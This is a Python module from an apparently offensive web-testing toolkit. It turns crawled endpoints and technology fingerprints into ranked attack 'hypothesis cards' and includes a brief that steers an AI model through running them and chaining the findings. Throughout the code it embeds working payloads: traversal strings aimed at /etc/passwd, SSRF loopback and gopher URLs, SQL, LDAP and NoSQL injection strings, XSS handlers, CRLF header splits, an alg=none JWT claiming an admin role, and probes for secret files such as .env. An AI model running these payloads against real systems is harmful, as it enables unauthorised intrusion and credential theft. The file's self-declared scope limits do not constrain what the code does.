#!/usr/bin/env python3
"""SPYDERMONKEY HYPOTHESIS ENGINE — THE REASONING ENGINE (v5.6.0 · merged into the 5.11.0 lineage).

Turns the family's existing datasets into ranked, testable, wall-checked
hypotheses — the reasoning scaffold that guides ANY model (or the model-free
kernel) toward vulnerability instances the standard batteries have not yet
confirmed:

  1. SURFACE   — observed params/endpoints/auth model → candidate classes
                 (reasons from the testers' own proven vocabularies)
  2. CVE-MAP   — tech fingerprints → documented CVE-class families with
                 probe shapes (CWE-anchored, documented-PoC adaptation only)
  3. VARIANTS  — a confirmed finding → documented encoding/marker variants
                 the standard battery never fired (the "find new ones" loop)
  4. CHAINS    — hypothesis pairs that would complete a known kill chain

Every card carries: the reasoning trace (WHY this hypothesis exists), the
exact probe recipe (baseline → attack → measurable diff), the corpus
citations to lazy-load, and the walls restated. Execution stays in the
dispatcher — the same scope authority, the same 3-gate engine, the same
ledger. This module is PURE: datasets + reasoning, no I/O beyond the
family state files it is handed.

Walls (non-negotiable, inherited): declared estates only · documented-PoC
adaptation only (NEVER novel weapon classes — novel INSTANCES of documented
classes) · validation-only compromise · NO-GAIN · never social · zero
documents.
"""
from __future__ import annotations

import json
import os
import re
from pathlib import Path

VERSION = "5.11.0"

# ── the reasoning datasets ────────────────────────────────────────────────────
# All vocabularies here are the family's OWN, proven ones: the param shapes are
# the 18 differential testers' params, the endpoint shapes are the crawler's
# observed surface, the CVE classes are documented families with published
# PoC patterns (CWE-anchored). Nothing novel is invented; instances are.

# param-name shape → candidate classes (the testers' own param vocabulary)
PARAM_CLASS_MAP = [
    (r"^(id|.*_id)$", ["IDOR"], "numeric/uuid object identifier — swap it"),
    (r"^(org|tenant|acct|account).*", ["IDOR"], "tenant-scoped identifier — cross-tenant swap"),
    (r"^(role|is_admin|admin|level|priv)$", ["AUTHZ", "MASSASSIGN"], "privilege field — flip it"),
    (r"^(q|search|filter|sort|query)$", ["INJECTION", "XSS"], "reflected query surface"),
    (r"^(msg|comment|name|title|body)$", ["XSS", "INJECTION"], "free-text reflected/stored surface"),
    (r"^(file|path|page|template|include|lang|download|doc|read)$",
     ["TRAVERSAL"], "path-shaped param — normalize check"),
    (r"^(url|uri|src|fetch|target|redirect|next|goto|dest|continue|return.*)$",
     ["SSRF", "REDIRECT", "CRLF"], "URL-shaped param — fetch/redirect/header contexts"),
    (r"^(token|jwt|auth|access_token|id_token|api_?key)$", ["JWT", "AUTHN"],
     "credential param — forgery/empty-accept classes"),
    (r"^(otp|code|nonce|pin)$", ["AUTHN"], "verifier param — brute/empty-accept class"),
    (r"^(sid|session.*|sess|phpsessid|jsessionid)$", ["SESSION"],
     "session identifier — structure/entropy class"),
    (r"^(qty|amount|price|count|discount|balance|credit)$", ["BIZLOGIC"],
     "money/quantity path — range/idempotency classes"),
    (r"^(user|username|email|login|pass|password)$", ["NOSQL", "AUTHN", "INJECTION"],
     "identity/credential surface — operator + bypass classes"),
    (r"^(debug|test|mock|stage|internal)$", ["HARVEST", "AUTHZ"],
     "debug-shaped param — environment leakage"),
]

# endpoint-path shape → candidate classes
ENDPOINT_CLASS_MAP = [
    (r"/api/", ["IDOR", "AUTHZ", "MASSASSIGN"], "API surface — object-level + function-level authz"),
    (r"/(login|auth|signin|session|token|oauth)", ["AUTHN", "NOSQL", "JWT"],
     "auth surface — bypass + forgery classes"),
    (r"/(admin|manage|console|panel|dashboard)", ["AUTHZ", "AUTHN"],
     "privileged surface — access-control classes"),
    (r"/(upload|import|attach)", ["TRAVERSAL", "INJECTION"], "file-handling surface — path + parser classes"),
    (r"/(export|download|report|invoice|pdf)", ["IDOR", "TRAVERSAL"], "document generation — object + path classes"),
    (r"/(search|query|find|list|filter)", ["INJECTION", "XSS"], "query surface — interpreter + reflection classes"),
    (r"/(webhook|callback|notify|hook)", ["REPLAY"], "callback surface — idempotency class"),
    (r"/(redirect|out|away|link|r)$", ["REDIRECT"], "redirector surface — target-trust class"),
    (r"/(graphql|gql)", ["AUTHZ", "INJECTION"], "graph surface — introspection + batching classes"),
    (r"/(profile|account|settings|user)", ["MASSASSIGN", "IDOR"], "profile surface — writable-field + object classes"),
    (r"/(pay|checkout|order|cart|billing)", ["BIZLOGIC", "REPLAY"], "money path — range + double-spend classes"),
    (r"/(debug|actuator|health|status|info|metrics)", ["HARVEST"], "ops surface — exposure class"),
]

# tech fingerprint → documented CVE-class families (probe-shaped, CWE-anchored).
# `cve_class` names the DOCUMENTED family these probes adapt; no novel weapon
# classes, no weaponized exploits — the probe column is the family's own
# differential shape for that class.
TECH_FINGERPRINTS = [
    {"match": r"express|node\.js|x-powered-by: express",
     "tech": "express/node",
     "families": [
         {"cve_class": "query-parser operator injection (documented express/qs family)",
          "cwe": "CWE-943", "cls": "NOSQL",
          "probe": {"params": ("user", "pass", "email", "q"),
                    "payloads": ['{"$ne":null}', "[$ne]=1", '{"$gt":""}']}},
         {"cve_class": "CRLF/response-splitting via unnormalized header echo (documented family)",
          "cwe": "CWE-113", "cls": "CRLF",
          "probe": {"params": ("next", "redirect", "page", "lang", "url"),
                    "payloads": ["%0d%0aX-Probe: spy"]}},
     ]},
    {"match": r"php|x-powered-by: php",
     "tech": "php",
     "families": [
         {"cve_class": "file-inclusion/traversal with wrapper+encoding chains (documented family)",
          "cwe": "CWE-98", "cls": "TRAVERSAL",
          "probe": {"params": ("file", "page", "path", "template", "lang", "include"),
                    "payloads": ["....//etc/passwd", "php://filter/resource=/etc/passwd",
                                 "..%252f..%252fetc%252fpasswd"]}},
         {"cve_class": "header-injection in header-bearing contexts (documented family)",
          "cwe": "CWE-113", "cls": "CRLF",
          "probe": {"params": ("page", "lang", "next"),
                    "payloads": ["%0d%0aSet-Cookie: spy=1",
                                 "%E5%98%8A%E5%98%8DX-Probe: spy"]}},
     ]},
    {"match": r"spring|java|actuator|jboss|tomcat|wildfly",
     "tech": "jvm/spring",
     "families": [
         {"cve_class": "actuator/env endpoint exposure (documented spring-boot family)",
          "cwe": "CWE-200", "cls": "HARVEST",
          "probe": {"paths": ("actuator/env", "actuator/heapdump", "env", "jolokia")},
          "note": "GET-only, count-only: NO-GAIN"},
         {"cve_class": "template expression evaluation (documented SSTI family)",
          "cwe": "CWE-1336", "cls": "INJECTION",
          "probe": {"params": ("q", "name", "view", "page", "msg"),
                    "payloads": ["${7*7}", "{{7*7}}", "*{7*7}", "#{7*7}"]}},
     ]},
    {"match": r"django|flask|python|werkzeug|gunicorn",
     "tech": "python",
     "families": [
         {"cve_class": "template expression evaluation (documented jinja family)",
          "cwe": "CWE-1336", "cls": "INJECTION",
          "probe": {"params": ("q", "name", "view", "template", "msg"),
                    "payloads": ["{{7*7}}", "{{7*'7'}}", "{7*7}"]}},
         {"cve_class": "debug-traceback exposure (documented werkzeug family)",
          "cwe": "CWE-200", "cls": "HARVEST",
          "probe": {"paths": ("console", "debug", "_debug")}},
     ]},
    {"match": r"graphql",
     "tech": "graphql",
     "families": [
         {"cve_class": "introspection enabled on production graphs (documented family)",
          "cwe": "CWE-200", "cls": "HARVEST",
          "probe": {"paths": ("graphql", "api/graphql", "gql"),
                    "bodies": ('{"query":"{__schema{types{name}}}"}',)}},
         {"cve_class": "field-level authorization gaps on graph resolvers (documented family)",
          "cwe": "CWE-862", "cls": "AUTHZ",
          "probe": {"note": "two-role differential over graph operations"}},
     ]},
    {"match": r"asp\.net|iis|microsoft|blazor",
     "tech": "dotnet",
     "families": [
         {"cve_class": "viewstate/mac validation gaps (documented family — fingerprint only)",
          "cwe": "CWE-345", "cls": "CRYPTO",
          "probe": {"note": "fingerprint + posture only; no deserialization probes"}},
         {"cve_class": "trace.axd/elmah diagnostic exposure (documented family)",
          "cwe": "CWE-200", "cls": "HARVEST",
          "probe": {"paths": ("trace.axd", "elmah.axd", "_elmah")}},
     ]},
    {"match": r"jwt|authorization: bearer",
     "tech": "jwt",
     "families": [
         {"cve_class": "alg=none / signature-skip verification (documented family)",
          "cwe": "CWE-347", "cls": "JWT",
          "probe": {"params": ("token", "jwt", "auth", "access_token"),
                    "payloads": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
                                 "eyJyb2xlIjoiYWRtaW4ifQ."]}},
     ]},
    {"match": r"nginx|apache|cloudflare|varnish|squid",
     "tech": "edge/webserver",
     "families": [
         {"cve_class": "origin discovery / header-trust differentials (documented family)",
          "cwe": "CWE-74", "cls": "CRLF",
          "probe": {"params": ("next", "url", "redirect"),
                    "payloads": ["%0d%0aX-Probe: spy"]}},
     ]},
]

# variant grammars — documented encoding/marker families per class that the
# standard battery does NOT fire. Each entry names its source family; the
# dispatcher re-proves through the SAME differential verdicts.
VARIANT_GRAMMARS = {
    "TRAVERSAL": [
        {"family": "overlong-utf8 traversal", "source": "documented WSTG-INPV family",
         "payloads": ["..%c0%af..%c0%afetc%c0%afpasswd", "%c0%ae%c0%ae/"]},
        {"family": "double-encoding", "source": "documented WSTG-INPV family",
         "payloads": ["..%252f..%252fetc%252fpasswd", "%252e%252e%252f"]},
        {"family": "wrapper streams", "source": "documented php-wrapper family",
         "payloads": ["php://filter/resource=/etc/passwd", "file:///etc/passwd"]},
        {"family": "mixed separators + filter evasion", "source": "documented WSTG-INPV family",
         "payloads": ["....//etc/passwd", "..\\/..\\/etc\\/passwd", "..%5c..%5cetc%5cpasswd"]},
    ],
    "SSRF": [
        {"family": "rare loopback encodings", "source": "documented SSRF family",
         "payloads": ["http://0177.0.0.1:9/", "http://0:9/",
                      "http://[::ffff:127.0.0.1]:9/", "http://[0000::1]:9/"],
         "note": "loopback probes only — the estate's own host, no third parties"},
        {"family": "alternative schemes", "source": "documented SSRF family",
         "payloads": ["gopher://127.0.0.1:9/_x", "dict://127.0.0.1:9/"]},
    ],
    "INJECTION": [
        {"family": "boolean/arith markers", "source": "documented WSTG-INPV family",
         "payloads": ["1 OR 1=1", "') OR ('1'='1", "1) AND 1=1-- -"]},
        {"family": "ldap filter markers", "source": "documented LDAP-injection family",
         "payloads": ["*)(uid=*))(|(uid=*", "*))%00"]},
        {"family": "nosql-in-json markers", "source": "documented operator-injection family",
         "payloads": ['{"$where": "7*7==49"}', '{"$regex": "^.*"}']},
    ],
    "XSS": [
        {"family": "event-handler context variants", "source": "documented WSTG-CLNT family",
         "payloads": ["<details open ontoggle=spy>", "<svg><animate onbegin=spy>",
                      "<video><source onerror=spy>", "<body onload=spy>"]},
        {"family": "attribute-breakout variants", "source": "documented WSTG-CLNT family",
         "payloads": ['"><svg/onload=spy>', "'><img src=x onerror=spy>"]},
    ],
    "REDIRECT": [
        {"family": "scheme-relative + confusion", "source": "documented CWE-601 family",
         "payloads": ["///redirect.probe.invalid", "/\\/redirect.probe.invalid",
                      "https:/\\/redirect.probe.invalid", "//redirect.probe.invalid%2f.."]},
    ],
    "NOSQL": [
        {"family": "blind-bool operator markers", "source": "documented operator-injection family",
         "payloads": ['{"$regex":"^a"}', '{"$ne":""}', "[$where]=1==1"]},
    ],
    "CRLF": [
        {"family": "unicode-encoded CRLF", "source": "documented CWE-113 family",
         "payloads": ["%E5%98%8A%E5%98%8DX-Probe: spy",
                      "%E5%98%8A%E5%98%8DSet-Cookie: spy=1"]},
    ],
    "JWT": [
        {"family": "kid-path markers", "source": "documented key-id traversal family",
         "payloads": ["eyJhbGciOiJub25lIiwia2lkIjoiLi4vLi4vZXRjL3Bhc3N3ZCJ9."],
         "note": "marker-only: header claims observed, never forged keys"},
    ],
    "IDOR": [
        {"family": "shape successors", "source": "documented object-id family",
         "payloads": ["__SHAPE_SUCCESSOR__"],
         "note": "the dispatcher expands per observed id shape (uuid/numeric/slug)"},
    ],
}

CITATIONS = {
    "TRAVERSAL": ["references/attack-canon.md", "references/wstg-deep-canon.md"],
    "SSRF": ["references/attack-canon.md", "references/cloud-canon.md"],
    "INJECTION": ["references/attack-canon.md", "references/wstg-deep-canon.md"],
    "XSS": ["references/wstg-deep-canon.md"],
    "REDIRECT": ["references/attack-canon.md"],
    "NOSQL": ["references/attack-canon.md"],
    "CRLF": ["references/attack-canon.md"],
    "JWT": ["references/attack-canon.md"],
    "IDOR": ["references/attack-canon.md", "references/wstg-deep-canon.md"],
    "AUTHZ": ["references/wstg-deep-canon.md"],
    "HARVEST": ["references/cloud-canon.md"],
    "REPLAY": ["references/attack-canon.md"],
    "CORS": ["references/wstg-deep-canon.md"],
    "AUTHN": ["references/wstg-deep-canon.md"],
    "SESSION": ["references/wstg-deep-canon.md"],
    "MASSASSIGN": ["references/attack-canon.md"],
    "BIZLOGIC": ["references/wstg-deep-canon.md"],
    "DIRECTORY": ["references/attack-canon.md"],
}

WALLS = ["declared estates only", "documented-PoC adaptation only",
         "validation-only · NO-GAIN", "never social · never third parties",
         "zero documents"]

SEVERITY_GUESS = {
    "IDOR": "high", "AUTHZ": "high", "AUTHN": "critical", "JWT": "critical",
    "NOSQL": "critical", "INJECTION": "critical", "TRAVERSAL": "high",
    "SSRF": "high", "CRLF": "high", "REDIRECT": "medium", "CORS": "high",
    "MASSASSIGN": "high", "BIZLOGIC": "medium", "REPLAY": "medium",
    "HARVEST": "high", "DIRECTORY": "medium", "SESSION": "high",
    "XSS": "medium", "CRYPTO": "high",
}

# path-probe vocabularies for the classes whose evidence lives at predictable
# paths (the testers' own lists — GET-only, count-only, NO-GAIN)
HARVEST_PATHS = (".env", ".git/HEAD", ".svn/entries", ".DS_Store",
                 "backup.zip", "backup.sql", "dump.sql", "debug", "phpinfo",
                 "phpinfo.php", "actuator/env", "swagger.json", "api-docs",
                 "server-status")
DIRECTORY_PATHS = ("files/", "backup/", "static/", "data/", "uploads/",
                   "images/", "assets/", "archive/", "old/", "test/")
PATH_PROBE_CONTROL = "__spydermonkey_control__"


# ── state assembly ───────────────────────────────────────────────────────────

def _priors(camp, _j) -> dict:
    """The ranker's priors: campaign-local overrides, then the GLOBAL learned
    priors that `train` (the self-play loop) writes —
    $SPYDERMONKEY_HOME/memory/spydermonkey-priors.json — as per-class
    hit rates, Laplace-smoothed into class_priors floats. Without this wire
    the reasoning engine would ignore everything the family learned."""
    merged = {}
    local = _j("hypothesis-priors.json", {})
    if isinstance(local, dict):
        merged.update(local)
    root = Path(os.environ.get("SPYDERMONKEY_HOME",
                               str(Path.home() / ".redteam")))
    gp = root / "memory" / "spydermonkey-priors.json"
    if gp.exists():
        try:
            learned = json.loads(gp.read_text())
        except Exception:
            learned = {}
        cp = merged.setdefault("class_priors", {})
        for cls, d in learned.items():
            if not isinstance(d, dict) or "runs" not in d:
                continue
            runs = max(1, int(d.get("runs", 1)))
            hits = int(d.get("hits", 0))
            cp.setdefault(str(cls).upper(), round((hits + 1) / (runs + 2), 3))
    return merged


def load_state(camp) -> dict:
    """Read the family state files the reasoning grounds on. `camp` is the
    campaign directory (Path). Pure readers — never write."""
    camp = camp if isinstance(camp, Path) else Path(camp)

    def _j(name, default):
        p = camp / name
        if not p.exists():
            return default
        try:
            return json.loads(p.read_text())
        except Exception:
            return default

    ledger = []
    lp = camp / "ledger.jsonl"
    if lp.exists():
        for line in lp.read_text().splitlines():
            try:
                ledger.append(json.loads(line))
            except Exception:
                pass
    return {
        "context": _j("context.json", {"endpoints": [], "roles": [],
                                       "credentials": [], "functions": []}),
        "ledger": ledger,
        "priors": _priors(camp, _j),
        "arsenal": _j("arsenal-state.json", {"runs": []}),
        "chains": _j("chain-state.json", {}).get("chains", []),
    }


def observed_surface(state: dict) -> list[str]:
    """The surface the reasoning grounds on: the mined context endpoints;
    when the crawler has not run, the ledger's own assets ARE the observed
    surface (they were live enough to produce findings)."""
    ctx = state["context"]
    endpoints = list(ctx.get("endpoints") or [])
    if not endpoints:
        seen = set()
        for r in state["ledger"]:
            a = r.get("asset") or ""
            if a.startswith(("http://", "https://")) and a not in seen:
                seen.add(a)
                endpoints.append(a)
    return endpoints


def _confirmed_classes(ledger) -> set:
    return {str(r.get("cls", "")).upper() for r in ledger
            if str(r.get("status", "")).upper() == "CONFIRMED"}


def _asset_confirmed(ledger, cls, asset) -> bool:
    """Confirmed on this asset — compared on scheme+host+path so a query
    difference (the gate's stored form vs the context's form) never defeats
    the dedupe."""
    def _key(u):
        from urllib.parse import urlsplit
        sp = urlsplit(u or "")
        return (sp.scheme.lower(), sp.netloc.lower(), sp.path.rstrip("/"))
    a, c = _key(asset), (cls or "").upper()
    return any(str(r.get("cls", "")).upper() == c
               and _key(str(r.get("asset") or "")) == a
               and str(r.get("status", "")).upper() == "CONFIRMED"
               for r in ledger)


# ── generator 1: surface → candidate classes ────────────────────────────────

def _ep_matches(ep: str):
    """Yield (classes, why) for every param/endpoint shape the ep exhibits."""
    from urllib.parse import urlsplit, parse_qsl
    sp = urlsplit(ep)
    path = sp.path or "/"
    params = [k for k, _ in parse_qsl(sp.query, keep_blank_values=True)]
    seen = []
    for pat, classes, why in ENDPOINT_CLASS_MAP:
        if re.search(pat, path, re.I):
            seen.append((classes, f"endpoint shape matches {pat} — {why}"))
    for p in params:
        for pat, classes, why in PARAM_CLASS_MAP:
            if re.search(pat, p, re.I):
                seen.append((classes, f"param '{p}' matches {pat} — {why}"))
    if not seen and params:
        seen.append((["INJECTION", "XSS"], "unclassified param — reflection classes first"))
    return seen


def _first_param(ep: str, cls: str) -> str:
    from urllib.parse import urlsplit, parse_qsl
    params = [k for k, _ in parse_qsl(urlsplit(ep).query, keep_blank_values=True)]
    for p in params:
        for pat, classes, _w in PARAM_CLASS_MAP:
            if cls in classes and re.search(pat, p, re.I):
                return p
    return params[0] if params else "(none)"


def _surface_probe(cls: str, ep: str, state: dict) -> dict:
    """The exact probe recipe — baseline → attack → measurable diff.
    Reuses the testers' own attack lambdas where they exist."""
    from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit
    sp = urlsplit(ep)
    params = dict(parse_qsl(sp.query, keep_blank_values=True))
    base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
    target_param = _first_param(ep, cls)
    orig = params.get(target_param, "")
    probes = {
        "IDOR": lambda v: [str(int(v) + 1) if v.isdigit() else v + "1", "0"],
        "AUTHZ": lambda v: ["admin", "1", "true"],
        "TRAVERSAL": lambda v: ["../../etc/passwd", "....//etc/passwd"],
        "SSRF": lambda v: ["http://127.0.0.1:9/"],
        "REDIRECT": lambda v: ["//redirect.probe.invalid/x"],
        "INJECTION": lambda v: ["'", "{{7*7}}"],
        "XSS": lambda v: ["spy<svg/onload=x>"],
        "JWT": lambda v: ["", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."],
        "AUTHN": lambda v: ["", "000000"],
        "SESSION": lambda v: [v + "1", "0"],
        "BIZLOGIC": lambda v: ["-1", "0", "999999"],
        "NOSQL": lambda v: ['{"$ne":null}', "[$ne]=1"],
        "CRLF": lambda v: [v + "%0d%0aX-Probe: spy"],
        "MASSASSIGN": lambda v: [v],
    }
    fn = probes.get(cls)
    if fn is None:
        if cls in ("HARVEST", "DIRECTORY"):
            root = urlunsplit((sp.scheme, sp.netloc, "/", "", ""))
            paths = HARVEST_PATHS if cls == "HARVEST" else DIRECTORY_PATHS
            return {"method": "GET", "base": root, "paths": list(paths),
                    "control": PATH_PROBE_CONTROL,
                    "diff": "the control path is the baseline; a candidate "
                            "answering with sensitive content/listing is the proof"}
        return {"method": "GET", "url": base, "note": "class-specific runner required"}
    attacks = fn(orig) if orig else fn("1")
    return {"method": "GET", "url": base,
            "param": target_param, "baseline": urlencode(params) or "(none)",
            "attacks": attacks,
            "diff": "status/length/body delta through the class verdict"
                    " — the 3-gate engine decides"}


def surface_hypotheses(state: dict, target: str, url: str | None = None,
                       limit: int = 64) -> list[dict]:
    cards = []
    ledger = state["ledger"]
    confirmed = _confirmed_classes(ledger)
    endpoints = observed_surface(state)
    if url:
        endpoints = [url] + [e for e in endpoints if e != url]
    if not endpoints:
        return []
    n = 0
    for ep in endpoints:
        for classes, why in _ep_matches(ep):
            for cls in classes:
                if cls in confirmed and _asset_confirmed(ledger, cls, ep):
                    continue  # already proven here — the battery owns it
                n += 1
                cards.append({
                    "id": f"HYP-S{n:03d}", "kind": "surface", "cls": cls,
                    "asset": ep, "param": _first_param(ep, cls),
                    "title": f"{cls} candidate on {ep}",
                    "why": [why, "not yet confirmed on this asset"],
                    "probe": _surface_probe(cls, ep, state),
                    "citations": CITATIONS.get(cls, []),
                    "walls": WALLS, "severity_guess": SEVERITY_GUESS.get(cls, "medium"),
                    "score": 0.0,
                })
                if n >= limit:
                    return cards
    return cards


# ── generator 2: fingerprints → documented CVE-class families ────────────────

_CVE_INSTANCES_CACHE = None


def _cve_instances() -> dict[str, list[str]]:
    """The catalog surge → CVE token → evidence entries map (lazy, cached).
    Every documented family card now cites REAL public CVE-indexed instances
    from the 66.5k-entry corpus — density in the reasoning, not just in the
    index (v7.6.1)."""
    global _CVE_INSTANCES_CACHE
    if _CVE_INSTANCES_CACHE is not None:
        return _CVE_INSTANCES_CACHE
    out = {}
    p = Path(__file__).resolve().parent.parent / "references" \
        / "tool-catalog-surge.json"
    try:
        data = json.loads(p.read_text())
        for entries in data.get("sections", {}).values():
            for e in entries:
                blob = f"{e.get('name', '')} {e.get('desc', '')}"
                for tok in re.findall(r"CVE-\d{4}-\d{4,7}", blob):
                    out.setdefault(tok.upper(), []).append(
                        f"{e.get('name', '')}: {e.get('desc', '')[:60]} "
                        f"[{e.get('src', '')}]")
    except Exception:
        out = {}
    _CVE_INSTANCES_CACHE = out
    return out


def _family_instances(fam: dict, spec: dict, fp: str = "", limit: int = 3) -> list[str]:
    """Real public instances for a documented family: catalog entries whose
    CVE token AND a family/fingerprint keyword co-occur. Strict — no
    keywords, no cites."""
    kws = [w for w in re.split(r"[^a-z0-9]+",
                               f"{fam.get('cve_class', '')} {spec.get('tech', '')} "
                               f"{fp}".lower()) if len(w) >= 4]
    if not kws:
        return []
    out = []
    for cve, refs in _cve_instances().items():
        for r in refs:
            if any(k in r.lower() for k in kws):
                out.append(f"{cve} → {r}")
                if len(out) >= limit:
                    return out
    return out


def _fingerprints(state: dict) -> list[str]:
    fps = []
    for r in state["arsenal"].get("runs", []):
        if isinstance(r, str):          # a bare fingerprint string
            fps.append(r)
            continue
        for f in (r.get("findings") or []):
            if isinstance(f, str):
                fps.append(f)
    ctx = state["context"]
    fps.extend(str(x) for x in ctx.get("fingerprints", []))
    return fps


def cve_hypotheses(state: dict, target: str, limit: int = 32) -> list[dict]:
    fps = _fingerprints(state)
    cards = []
    n = 0
    seen_pairs = set()
    for fp in fps:
        for spec in TECH_FINGERPRINTS:
            if not re.search(spec["match"], fp, re.I):
                continue
            for fam in spec["families"]:
                key = (fam["cls"], fam["cwe"])
                if key in seen_pairs:
                    continue
                seen_pairs.add(key)
                n += 1
                probe = dict(fam.get("probe", {}))
                inst = _family_instances(fam, spec, fp=fp)
                why = [f"fingerprint '{fp}' matches {spec['tech']}",
                       f"documented family: {fam['cve_class']}",
                       "adapt the published PoC pattern to this estate"]
                if inst:
                    why.append(f"{len(inst)} CVE-indexed catalog instance(s) cited")
                cards.append({
                    "id": f"HYP-C{n:03d}", "kind": "cve-map", "cls": fam["cls"],
                    "asset": target, "param": (probe.get("params") or ("(none)",))[0],
                    "title": f"{fam['cve_class']} ({fam['cwe']}) — {spec['tech']} fingerprint",
                    "why": why,
                    "instances": inst,
                    "probe": probe,
                    "citations": CITATIONS.get(fam["cls"], []),
                    "walls": WALLS + [fam.get("note", "documented-PoC adaptation only")],
                    "severity_guess": SEVERITY_GUESS.get(fam["cls"], "medium"),
                    "score": 0.0,
                })
                if n >= limit:
                    return cards
    return cards


# ── generator 3: confirmed finding → untried variants ────────────────────────

def variant_hypotheses(state: dict, target: str, limit: int = 32) -> list[dict]:
    ledger = state["ledger"]
    confirmed = [r for r in ledger
                 if str(r.get("status", "")).upper() == "CONFIRMED"]
    cards = []
    n = 0
    from urllib.parse import quote, urlsplit
    from json import dumps as _dumps

    def _akey(u):
        sp = urlsplit(u or "")
        return (sp.scheme.lower(), sp.netloc.lower(), sp.path.rstrip("/"))

    for r in confirmed:
        cls = str(r.get("cls", "")).upper()
        asset = r.get("asset") or ""
        grammars = VARIANT_GRAMMARS.get(cls)
        if not grammars:
            continue
        # which payloads did ANY confirmed evidence on this asset already
        # fire? proofs embed the (url-encoded) payload — check every row on
        # the same scheme+host+path, not just the parent (a second confirmed
        # row for the same flaw must not re-open payloads already proven)
        same_asset = [x for x in confirmed if _akey(x.get("asset")) == _akey(asset)]
        row_text = _dumps(same_asset)
        for g in grammars:
            fresh = [p for p in g["payloads"]
                     if p not in row_text and quote(p, safe="") not in row_text]
            if not fresh:
                continue
            n += 1
            cards.append({
                "id": f"HYP-V{n:03d}", "kind": "variant", "cls": cls,
                "asset": asset, "param": "(observed)",
                "title": f"{cls} variant family '{g['family']}' on {asset}",
                "why": [f"confirmed {cls} on this asset — same flaw may hold under other encodings",
                        f"variant source: {g['source']}",
                        "the standard battery never fired these markers here"],
                "probe": {"payloads": fresh, **({"note": g["note"]} if g.get("note") else {})},
                "citations": CITATIONS.get(cls, []),
                "walls": WALLS,
                "severity_guess": r.get("severity", SEVERITY_GUESS.get(cls, "medium")),
                "score": 0.0, "parent": r.get("id"),
            })
            if n >= limit:
                return cards
    return cards


# ── generator 4: hypothesis pairs that complete kill chains ──────────────────

CHAIN_COMPLETIONS = [
    {"chain": "credential_endpoint",
     "need": ("HARVEST", "AUTHZ"), "give": ("AUTHN", "IDOR"),
     "plan": "exposed material + an authz gap on the auth surface → validate the material against the live auth path (one reversible attempt)"},
    {"chain": "cors_credential_read",
     "need": ("CORS",), "give": ("AUTHZ", "IDOR"),
     "plan": "ACAO reflection + a credential-bearing endpoint → cross-origin read proof (read-only)"},
    {"chain": "nosql_authn",
     "need": ("NOSQL",), "give": ("AUTHN",),
     "plan": "operator injection on the identity surface → forged authentication marker"},
    {"chain": "info_disclosure_ssrf",
     "need": ("HARVEST",), "give": ("SSRF",),
     "plan": "disclosed internal host + a fetch param → pivot the fetch at it (GET-only, no-gain)"},
    {"chain": "redirect_oauth",
     "need": ("REDIRECT",), "give": ("AUTHN", "JWT"),
     "plan": "open redirect + an oauth/sso callback → code-interception shape (marker only)"},
]


def chain_hypotheses(state: dict, target: str, limit: int = 24) -> list[dict]:
    ledger = state["ledger"]
    confirmed = _confirmed_classes(ledger)
    cards = []
    n = 0
    for spec in CHAIN_COMPLETIONS:
        have = [c for c in spec["need"] if c in confirmed]
        missing = [c for c in spec["give"] if c not in confirmed]
        if not have or not missing:
            continue
        n += 1
        cards.append({
            "id": f"HYP-K{n:03d}", "kind": "chain", "cls": missing[0],
            "asset": target, "param": "(none)",
            "title": f"complete '{spec['chain']}': have {have}, seek {missing}",
            "why": [f"confirmed signals cover {have}",
                    f"the chain completes if {missing} confirms",
                    spec["plan"]],
            "probe": {"note": spec["plan"]},
            "citations": CITATIONS.get(missing[0], []),
            "walls": WALLS, "severity_guess": "high",
            "score": 0.0,
        })
        if n >= limit:
            return cards
    return cards


# ── the ranker — priors-weighted, wall-checked ───────────────────────────────

CLASS_PRIOR = {
    "AUTHN": 0.9, "JWT": 0.9, "NOSQL": 0.85, "IDOR": 0.8, "AUTHZ": 0.8,
    "INJECTION": 0.75, "TRAVERSAL": 0.7, "SSRF": 0.7, "CRLF": 0.6,
    "MASSASSIGN": 0.65, "CORS": 0.6, "REDIRECT": 0.5, "BIZLOGIC": 0.5,
    "REPLAY": 0.45, "HARVEST": 0.6, "DIRECTORY": 0.4, "SESSION": 0.5,
    "XSS": 0.5, "CRYPTO": 0.3,
}
KIND_WEIGHT = {"variant": 1.0, "cve-map": 0.9, "chain": 0.85, "surface": 0.7}
# the canon classes `train` learns under cover card classes the dojo has no
# direct twin for
PRIOR_ALIASES = {"IDOR": "BOUNDARY", "AUTHZ": "BOUNDARY",
                 "MASSASSIGN": "BOUNDARY", "BIZLOGIC": "REPLAY"}


def rank(cards: list[dict], state: dict) -> list[dict]:
    priors = state.get("priors") or {}
    class_priors = priors.get("class_priors", {}) if isinstance(priors, dict) else {}
    for c in cards:
        base = CLASS_PRIOR.get(c["cls"], 0.5)
        learned = class_priors.get(c["cls"])
        if learned is None and c["cls"] in PRIOR_ALIASES:
            learned = class_priors.get(PRIOR_ALIASES[c["cls"]])
        score = (0.5 * base + 0.5 * learned) if isinstance(learned, (int, float)) else base
        score *= KIND_WEIGHT.get(c["kind"], 0.5)
        # confirmed classes on this estate are likelier to confirm again elsewhere
        if c["cls"] in _confirmed_classes(state["ledger"]):
            score *= 1.15
        c["score"] = round(min(score, 1.0), 3)
    return sorted(cards, key=lambda c: -c["score"])


# ── the model brief — the guidance document ──────────────────────────────────

def model_brief(cards: list[dict], target: str, top: int = 12) -> dict:
    """The brief a model consumes: ranked hypotheses + the exact loop to run
    them through. The model REASONS over this; the kernel EXECUTES it."""
    top_cards = cards[:top]
    return {
        "target": target,
        "hypotheses": top_cards,
        "count": len(cards),
        "shown": len(top_cards),
        "loop": [
            "1. read each card's `why` — that is the reasoning trace; challenge or accept it",
            "2. load the `citations` (lazy — only what the chosen card needs)",
            "3. run the card's `probe` through the dispatcher: "
            "gate run --target T --url <baseline> --attack-url <attack> --attack-data <data>",
            "4. a CONFIRMED result lands in the ledger; a HYPOTHESIS stays honest "
            "(downgraded, never suppressed)",
            "5. feed confirmed classes back: `hypothesis gen --target T` regenerates "
            "with the new state — variants and chain completions open up",
        ],
        "rules": [
            "reason over documented classes; never invent novel weapon classes",
            "novel INSTANCES of documented classes are the goal",
            "every claim needs the 3-gate differential or it stays a hypothesis",
            "walls are absolute: declared estates, validation-only, NO-GAIN, "
            "never social, zero documents",
        ],
    }


def generate(state: dict, target: str, url: str | None = None,
             kinds: tuple = ("surface", "cve-map", "variant", "chain")) -> dict:
